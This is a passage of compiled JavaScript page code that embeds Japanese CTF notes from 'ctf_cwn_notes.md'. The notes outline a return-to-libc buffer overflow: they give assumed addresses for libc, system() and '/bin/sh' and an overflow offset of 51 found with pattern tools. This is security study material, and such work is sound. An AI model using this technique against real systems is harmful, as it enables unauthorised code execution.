libc.so.6の番地を"),s("code",[this._v("0xf7ce1000")]),this._v("と仮定して,\nsystem関数を"),s("code",[this._v("0xf7d1e200")]),this._v(",\nbin/shを"),s("code",[this._v("0xf7e8b0cf")]),this._v("と仮定する。")])},function(){var t=this.$createElement,s=this._self._c||t;return s("p",[this._v("pattern_createとpattoを用いて, OFが起きている部分を確認すると, offsetは"),s("strong",[this._v("51")]),this._v("だった。")])},function(){var t=this.$createElement,s=this._self._c||t;return s("h1",{attrs:{id:"references"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#references","aria-hidden":"true"}},[this._v("#")]),this._v(" References")])}],!1,null,null,null);n.options.__file="ctf_cwn_notes.md";s.default=n.exports}}]);